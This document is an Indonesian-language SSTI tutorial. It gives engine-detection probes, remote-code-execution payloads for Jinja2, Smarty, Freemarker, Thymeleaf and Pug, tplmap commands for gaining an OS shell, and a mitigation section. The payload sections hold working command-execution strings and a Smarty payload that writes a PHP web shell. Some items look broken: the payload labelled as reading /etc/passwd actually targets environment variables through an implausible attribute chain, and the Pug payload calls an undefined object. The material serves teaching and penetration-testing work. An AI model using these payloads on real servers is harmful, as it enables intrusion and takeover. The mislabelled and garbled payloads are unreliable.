# 🧩 Server-Side Template Injection (SSTI)

## 1. Definisi
**Server-Side Template Injection (SSTI)** adalah kerentanan keamanan di mana penyerang menyisipkan sintaks template (*native template engine syntax*) ke dalam form input pengguna, yang kemudian digabungkan secara dinamis dan dieksekusi di sisi server (*server-side*) oleh mesin pemroses template (*template engine*).

Mesin template (seperti Jinja2 di Python, Smarty/Twig di PHP, Freemarker di Java) dirancang untuk menggabungkan data dengan template HTML. Jika input pengguna digabungkan langsung tanpa pembatasan, penyerang dapat mengeksekusi fungsi internal mesin template untuk membaca file lokal, memicu SSRF, hingga mengeksekusi perintah sistem (Remote Code Execution - RCE).

---

## 2. Cara Kerja & Identifikasi Engine

Untuk mendeteksi SSTI, kita menyisipkan karakter matematika khusus dan mengamati respon server. Berikut adalah bagan alir pendeteksian mesin template:

```
                  ${7*7}
                 /      \
             49 /        \ ${7*7}
               /          \
          a-z? {{7*7}}     {{7*7}}
          /   \           /       \
      49 /     \         / 49      \ {{7*7}}
        /       \       /           \
     Smarty    Twig   Jinja2     mako
```

### 🎯 Uji Karakter Matematika Standar:
* `${7*7}`
* `{{7*7}}`
* `{{ 7 * '7' }}` (Jika hasilnya `7777777` -> Jinja2/Mako; Jika error -> Twig/Smarty)

---

## 3. Contoh Payload RCE berdasarkan Template Engine

### 🐍 A. Python - Jinja2 / Flask
Jinja2 sering digunakan pada aplikasi Flask. Penyerang mengakses kelas bawaan Python via `__class__` untuk memanggil modul `os` guna menjalankan perintah RCE.

* **Payload Membaca File `/etc/passwd`**:
  ```html
  {{ get_flashed_messages.__self__.__req__.server.config.class.from_env.__self__.environ }}
  ```
* **Payload RCE (Mengeksekusi `id`)**:
  ```html
  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
  ```
  Atau menggunakan subclassing:
  ```html
  {{ [].__class__.__base__.__subclasses__()[422]('id', shell=True, stdout=-1).communicate()[0] }}
  ```
  *(Catatan: Indeks `422` di atas mewakili kelas `<class 'subprocess.Popen'>` dan nilainya dapat berbeda di setiap versi Python. Lakukan enumerasi subclass terlebih dahulu).*

### 🐘 B. PHP - Smarty
Smarty memiliki tag bawaan `{php}` atau fungsi `{system}` yang memudahkan eksekusi perintah:
```html
{Smarty_Internal_Write_File::writeFile('shell.php','<?php system($_GET["cmd"]); ?>',null)}
{system('id')}
```

### ☕ C. Java - Freemarker
Freemarker memungkinkan instansiasi objek API Java secara langsung melalui `Execute` built-in:
```html
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
```

### ☕ D. Java - Thymeleaf
```html
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()}__
```

### 🟢 E. Node.js - Pug (Jade)
```html
#{function(){localFile.require('child_process').execSync('id').toString()}()}
```

---

## 4. Cara Mendeteksi dengan Tool Otomatis

**tplmap** adalah alat bantu otomatisasi yang sangat kuat mirip dengan sqlmap, namun khusus untuk mendeteksi dan mengeksploitasi SSTI.

* **Scan Dasar**:
  ```bash
  tplmap -u "http://target.com/page?name=test"
  ```
* **Mendapatkan Shell Interaktif (OS Shell)**:
  ```bash
  tplmap -u "http://target.com/page?name=test" --os-shell
  ```

---

## 5. Mitigasi (Pencegahan)

### ✔️ 1. Hindari Penggabungan Teks Dinamis pada Template
Jangan pernah merangkai input pengguna langsung ke dalam string template sebelum diproses. Gunakan mekanisme penyediaan data bawaan (*context variables*) dari template engine.

* **Contoh Python/Flask yang RENTAN (Salah)**:
  ```python
  # Input pengguna digabungkan langsung ke string template
  template = '<h1>Halo %s!</h1>' % request.args.get('name')
  return render_template_string(template)
  ```

* **Contoh Python/Flask yang Aman (Benar)**:
  ```python
  # Input pengguna dilewatkan sebagai variabel konteks
  template = '<h1>Halo {{ user_name }}!</h1>'
  return render_template_string(template, user_name=request.args.get('name'))
  ```

### ✔️ 2. Aktifkan Sandbox Mode & Batasi Izin Eksekusi
Jika aplikasi Anda mengharuskan pengguna mengunggah file template khusus (seperti fitur custom layout):
* Gunakan mesin template yang memiliki fitur *Sandbox* bawaan yang ketat (seperti Twig Sandbox).
* Batasi akses kelas bawaan (seperti melarang akses ke fungsi refleksi, pemanggilan sistem, atau pembacaan berkas).

---

## 6. Referensi Terpercaya
* [PortSwigger Web Security Academy: SSTI Guide](https://portswigger.net/web-security/server-side-template-injection)
* [tplmap Repository on GitHub](https://github.com/epinna/tplmap)
* [PayloadsAllTheThings: Server-Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
